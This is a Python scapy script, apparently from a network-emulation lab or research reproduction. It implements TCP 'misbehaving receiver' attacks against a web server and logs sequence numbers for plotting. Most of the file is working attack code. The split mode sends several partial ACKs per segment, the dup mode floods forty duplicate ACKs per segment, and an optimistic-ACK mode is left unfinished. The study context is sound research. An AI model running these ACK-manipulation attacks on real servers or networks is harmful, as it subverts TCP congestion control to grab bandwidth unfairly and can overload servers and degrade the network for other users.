#! /usr/bin/env python
from scapy.all import *
import random
import sys
import numpy as np
import subprocess as sp

IP_DST = sys.argv[2]
DST_PORT =  int(sys.argv[3])

SRC_PORT = random.randint(1024,65535)
data = list()
FileName = "npy/%s.npy" % sys.argv[1]

socket = conf.L2socket(iface="client-eth0")

syn = IP(dst=IP_DST) / TCP(window=65535, sport=SRC_PORT, dport=DST_PORT, flags='S')
IP_SRC = syn[IP].src
SRC_PORT = syn[TCP].sport



#### Sending SYN
syn_ack = sr1(syn)
initialTs = syn_ack.time
initialSeq = syn_ack[TCP].seq

### Sending response after SYN_ACK
getStr = 'GET / HTTP/1.1\r\n\r\n'
request = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=(syn_ack[TCP].ack), ack=(syn_ack[TCP].seq + 1), flags='FA') / getStr
maxACK = (syn_ack[TCP].seq + 1)

print "Sending Request..."
socket.send(Ether() / request)


### Function to check the formatting of packet.
def check_pkt(pkt):
  global DST_PORT, IP_DST
  return (IP not in pkt) or (TCP not in pkt) or (pkt[IP].src != IP_DST) or (pkt[TCP].sport != DST_PORT)

### Calculate length of TCP data segment.
def data_len(pkt):
  ip_total_len = pkt.getlayer(IP).len
  ip_header_len = pkt.getlayer(IP).ihl * 32 / 8
  tcp_header_len = pkt.getlayer(TCP).dataofs * 32 / 8
  return ip_total_len - ip_header_len - tcp_header_len


### Proper handling for packet with normal transmission.
#########################################################
def normal(pkt):
  global DST_PORT, IP_DST, data, socket
  if (check_pkt(pkt)):
    return
  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
  ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=(pkt[TCP].ack), ack=(pkt[TCP].seq + data_len(pkt)), flags='A')
  socket.send(Ether() / ack_pkt)



### Proper handling for packet with DUP attack.
#########################################################
def dup(pkt):
  global DST_PORT, IP_DST, data, socket, maxACK
  if (check_pkt(pkt)):
    return
  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
  nextACK_num = (pkt[TCP].seq + data_len(pkt))
  if maxACK > nextACK_num:
    return
  maxACK = nextACK_num
  ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=(pkt[TCP].ack), ack=nextACK_num, flags='A')
  for i in xrange(40):
    socket.send(Ether() / ack_pkt)



### Proper handling for packet with SPLIT attack.
#########################################################
def split(pkt) :
  global DST_PORT, IP_DST, data, socket
  if (check_pkt(pkt)):
    return
  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
  tcp_seg_len = data_len(pkt)
  ACK_delta = tcp_seg_len / 3 # use 3 for now
  nextACK_num = pkt[TCP].seq + tcp_seg_len
  ACK_nums = list()
  if ACK_delta != 0:
    ACK_nums = range(pkt[TCP].seq + ACK_delta, nextACK_num, ACK_delta)
  if nextACK_num not in ACK_nums:
    ACK_nums.append(nextACK_num);
  for ACK_num in ACK_nums:
    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
             seq=pkt[TCP].ack, ack=ACK_num, flags='A')
    socket.send(Ether() / ack_pkt)


### Proper handling for OP attacks.
#########################################################
def op(pkt):
  global DST_PORT, IP_DST, data, socket, maxACK_num
  if (check_pkt(pkt)):
    return
  data.append((pkt.time - initialTs, pkt[TCP].seq - initialSeq))
  #  TODO: Finish op.


### Choose proper ACK handling given attack type.
#########################################################
if sys.argv[1] == "normal" :
    sniff(iface="client-eth0", prn=normal, filter="tcp and ip", timeout=4)
if sys.argv[1] == "dup":
    sniff(iface="client-eth0", prn=dup, filter="tcp and ip", timeout=4)
if sys.argv[1] == "op" :
    sniff(iface="client-eth0", prn=op, filter="tcp and ip", timeout=4)
if sys.argv[1] == "split" :
    sniff(iface="client-eth0", prn=split, filter="tcp and ip", timeout=4)


### Write data out to proper file.
#########################################################
numbas = np.asarray(zip(*data))
sp.call(["rm", "-f", FileName], shell=True)
np.save(FileName, numbas)
